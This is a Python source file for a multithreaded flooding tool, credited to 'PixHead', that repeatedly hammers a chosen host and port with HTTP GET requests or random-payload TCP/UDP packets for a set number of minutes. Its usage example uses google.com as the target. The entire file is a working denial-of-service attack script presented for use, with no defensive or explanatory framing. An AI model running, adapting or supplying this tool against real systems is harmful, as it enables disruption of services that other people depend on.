from datetime import datetime
from scapy.all import *
import socket
import random
import sys
import time
from threading import Thread
from termcolor import colored


def showBanner():
	with open("lib/banner.txt") as f:
		print(colored( f.read(), "red"))

def usageMsg():
	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [THREADS] [DURATION]"
                "\nEXAMPLE: python " + sys.argv[0] + "  http://google.com 80 10 5\n")
	exit(0)

showBanner()

if len(sys.argv) != 5:
	usageMsg()

try:
	ip       = ""
	host     = ""
	host_arr = []
	port     = int(sys.argv[2])
	threads  = int(sys.argv[3])
	duration = int(sys.argv[4])
except:
	usageMsg()

try:
	host_arr = sys.argv[1].split('/')
	host     = host_arr[2]
	ip       = str(socket.gethostbyname(host))

except:

	if len(sys.argv[1].split('.')) == 4:
		host = sys.argv[1]
		ip   = str(host)

	else:
		print(colored("Host is incorrect!\n","red"))
		usageMsg()

url      = ''
i        = 3
req      = 0
err      = 0
d        = "-------------"
prog     = (duration * 60.0) / 100.0

while i < len(host_arr):
	url += host_arr[i] + "/"
	i += 1

url = url.replace("//", "/")

for i in range(len(list(host))):
	d += "-"

request  = "GET /" + url + " HTTP/1.1\n"\
		"Host: " + host +"\n"\
                "Connection: close\n"\
                "User-agent: Mozila/5.0 (Windows: U; Windows NT 5.1; fr; rv:1.8.1.3) "\
                        "Gecko/20070309 firefox/2.0.0.3\n"\
                "Referer: http://google.com/\n"\
		"\n"

print("[*]Author: PixHead")
print(d)
print("[+]TARGET: " + host + " ¦")
print(d)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	sock.connect((host, port))
	print(colored("[*]", "green") + "SUCCESSFULLY CONNECTED!")
except:
	print(colored("[X]", "red") + "ERROR: Host is unreachable...")
	exit(0)

sock.close()

def atackHttp():
	while True:
		global req
		global err

		req += 1
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect((host, port))
			sock.send(request.encode())
		except:
			err += 1
		finally:
			sock.close()

		if req % 100 == 0:
			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 

def atackTcp():
	data = random._urandom(1024)
	r    = bytes(IP(dst=host)/TCP(sport=RandShort(), dport=int(port))/data)

	while True:
		global req
		global err

		req += 1
		sock = socket.socket()

		try:
			sock.connect((ip, port))
			sock.send(r)
		except:
			err += 1
		finally:
			sock.close()

		if req % 100 == 1:
			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")

def atackUdp():
	data = random._urandom(1024)
	r    = bytes(IP(dst=host)/UDP(dport=int(port))/data)

	while True:
		global req
		global err

		req += 1
		sock = socket.socket()

		try:
			sock.connect((ip, port))
			sock.send(r)
		except:
 			err += 1
		finally:
			sock.close()

		if req % 100 == 1:
			print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")

alltypes = ['udp','tcp','http','1','2','3']
type     = input("[HTTP/TCP/UDP][1/2/3] > ")

if type.lower() in alltypes:
	print('[+]Type set to ' + type)
else:
	print(colored('\nWrong type!\n',"red"))
	exit()

print("[*]STARTING...")

for i in range(threads):

	if type == '1' or type.lower() == 'http':
		th = Thread(target=atackHttp)
	elif type == '2' or type.lower() == 'tcp':
		th = Thread(target=atackTcp)
	elif type == '3' or type.lower() == 'udp':
		th = Thread(target=atackUdp)

	th.daemon = True
	th.start()

print(colored("[*]ALL THREADS ARE STARTED\n", "green"))

try:
	time.sleep(duration * 60)
except:
	print(colored("\nABORTING", "red"))
	exit()

print("\nDone!")
print("Total: " + str(req) + ", failed: " + str(err) + "\n")
sys.exit(0)
